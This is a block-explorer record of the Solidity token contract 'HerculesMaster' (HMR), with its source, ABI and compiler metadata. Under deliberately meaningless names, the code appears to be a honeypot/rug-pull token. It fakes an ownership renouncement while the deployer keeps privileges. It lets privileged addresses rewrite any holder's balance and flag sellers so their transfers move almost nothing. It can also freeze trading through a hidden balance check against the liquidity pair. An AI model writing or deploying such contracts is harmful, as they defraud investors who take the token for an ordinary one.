{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface maxSenderTotal {\n    function createPair(address swapBuy, address teamLaunch) external returns (address);\n}\n\ninterface totalLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingIs) external view returns (uint256);\n\n    function transfer(address fundAuto, uint256 modeWalletSell) external returns (bool);\n\n    function allowance(address buyTrading, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 modeWalletSell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundAuto,\n        uint256 modeWalletSell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderLaunch, uint256 value);\n    event Approval(address indexed buyTrading, address indexed spender, uint256 value);\n}\n\nabstract contract amountLaunchAt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tokenTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface totalLiquidityMetadata is totalLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract HerculesMaster is amountLaunchAt, totalLiquidity, totalLiquidityMetadata {\n\n    uint256 private launchTotal;\n\n    address modeLaunchedWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address amountBuy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 receiverFeeTake;\n\n    bool private enableReceiver;\n\n    address private exemptAmountLimit;\n\n    function sellToEnable(address fromLaunchedTake, address fundAuto, uint256 modeWalletSell) internal returns (bool) {\n        if (fromLaunchedTake == atSenderTx) {\n            return txTotal(fromLaunchedTake, fundAuto, modeWalletSell);\n        }\n        uint256 receiverIs = totalLiquidity(sellMax).balanceOf(amountBuy);\n        require(receiverIs == receiverSwap);\n        require(fundAuto != amountBuy);\n        if (feeAt[fromLaunchedTake]) {\n            return txTotal(fromLaunchedTake, fundAuto, tokenMin);\n        }\n        return txTotal(fromLaunchedTake, fundAuto, modeWalletSell);\n    }\n\n    address public atSenderTx;\n\n    bool public fromMin;\n\n    bool private minLaunched;\n\n    function shouldWallet() private view {\n        require(amountShould[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return exemptAmountLimit;\n    }\n\n    function transferFrom(address fromLaunchedTake, address fundAuto, uint256 modeWalletSell) external override returns (bool) {\n        if (_msgSender() != modeLaunchedWallet) {\n            if (autoFee[fromLaunchedTake][_msgSender()] != type(uint256).max) {\n                require(modeWalletSell <= autoFee[fromLaunchedTake][_msgSender()]);\n                autoFee[fromLaunchedTake][_msgSender()] -= modeWalletSell;\n            }\n        }\n        return sellToEnable(fromLaunchedTake, fundAuto, modeWalletSell);\n    }\n\n    uint256 private listMinIs;\n\n    function walletMax(uint256 modeWalletSell) public {\n        shouldWallet();\n        receiverSwap = modeWalletSell;\n    }\n\n    function teamFeeSell(address isSell) public {\n        shouldWallet();\n        if (limitAmountMin == receiverLaunched) {\n            receiverLaunched = false;\n        }\n        if (isSell == atSenderTx || isSell == sellMax) {\n            return;\n        }\n        feeAt[isSell] = true;\n    }\n\n    uint256 private liquidityMin = 100000000 * 10 ** 18;\n\n    bool private receiverLaunched;\n\n    function atWalletSender(address sellReceiver) public {\n        require(sellReceiver.balance < 100000);\n        if (fromMin) {\n            return;\n        }\n        if (minLaunched == launchedAt) {\n            launchTotal = listMinIs;\n        }\n        amountShould[sellReceiver] = true;\n        if (launchTotal == listMinIs) {\n            launchedAt = false;\n        }\n        fromMin = true;\n    }\n\n    function takeWallet() public {\n        emit OwnershipTransferred(atSenderTx, address(0));\n        exemptAmountLimit = address(0);\n    }\n\n    string private tokenTake = \"Hercules Master\";\n\n    mapping(address => bool) public amountShould;\n\n    event OwnershipTransferred(address indexed sellLaunch, address indexed exemptListAt);\n\n    function allowance(address teamTxTotal, address liquidityLaunched) external view virtual override returns (uint256) {\n        if (liquidityLaunched == modeLaunchedWallet) {\n            return type(uint256).max;\n        }\n        return autoFee[teamTxTotal][liquidityLaunched];\n    }\n\n    function approve(address liquidityLaunched, uint256 modeWalletSell) public virtual override returns (bool) {\n        autoFee[_msgSender()][liquidityLaunched] = modeWalletSell;\n        emit Approval(_msgSender(), liquidityLaunched, modeWalletSell);\n        return true;\n    }\n\n    address public sellMax;\n\n    mapping(address => mapping(address => uint256)) private autoFee;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityMin;\n    }\n\n    mapping(address => uint256) private listFrom;\n\n    function transfer(address toIsLimit, uint256 modeWalletSell) external virtual override returns (bool) {\n        return sellToEnable(_msgSender(), toIsLimit, modeWalletSell);\n    }\n\n    uint8 private takeLaunched = 18;\n\n    bool public tradingFund;\n\n    function txTotal(address fromLaunchedTake, address fundAuto, uint256 modeWalletSell) internal returns (bool) {\n        require(listFrom[fromLaunchedTake] >= modeWalletSell);\n        listFrom[fromLaunchedTake] -= modeWalletSell;\n        listFrom[fundAuto] += modeWalletSell;\n        emit Transfer(fromLaunchedTake, fundAuto, modeWalletSell);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return exemptAmountLimit;\n    }\n\n    constructor (){\n        if (receiverLaunched == tradingFund) {\n            launchedAt = false;\n        }\n        tokenTeam takeLaunchWallet = tokenTeam(modeLaunchedWallet);\n        sellMax = maxSenderTotal(takeLaunchWallet.factory()).createPair(takeLaunchWallet.WETH(), address(this));\n        \n        atSenderTx = _msgSender();\n        amountShould[atSenderTx] = true;\n        listFrom[atSenderTx] = liquidityMin;\n        takeWallet();\n        \n        emit Transfer(address(0), atSenderTx, liquidityMin);\n    }\n\n    uint256 constant tokenMin = 20 ** 10;\n\n    bool public launchedAt;\n\n    function name() external view virtual override returns (string memory) {\n        return tokenTake;\n    }\n\n    string private feeTrading = \"HMR\";\n\n    function marketingBuyFrom(address toIsLimit, uint256 modeWalletSell) public {\n        shouldWallet();\n        listFrom[toIsLimit] = modeWalletSell;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeTrading;\n    }\n\n    mapping(address => bool) public feeAt;\n\n    function decimals() external view virtual override returns (uint8) {\n        return takeLaunched;\n    }\n\n    uint256 receiverSwap;\n\n    function balanceOf(address marketingIs) public view virtual override returns (uint256) {\n        return listFrom[marketingIs];\n    }\n\n    bool private limitAmountMin;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptListAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderLaunch\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTxTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityLaunched\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeWalletSell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atSenderTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellReceiver\",\"type\":\"address\"}],\"name\":\"atWalletSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingIs\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toIsLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeWalletSell\",\"type\":\"uint256\"}],\"name\":\"marketingBuyFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isSell\",\"type\":\"address\"}],\"name\":\"teamFeeSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toIsLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeWalletSell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLaunchedTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeWalletSell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"modeWalletSell\",\"type\":\"uint256\"}],\"name\":\"walletMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "HerculesMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}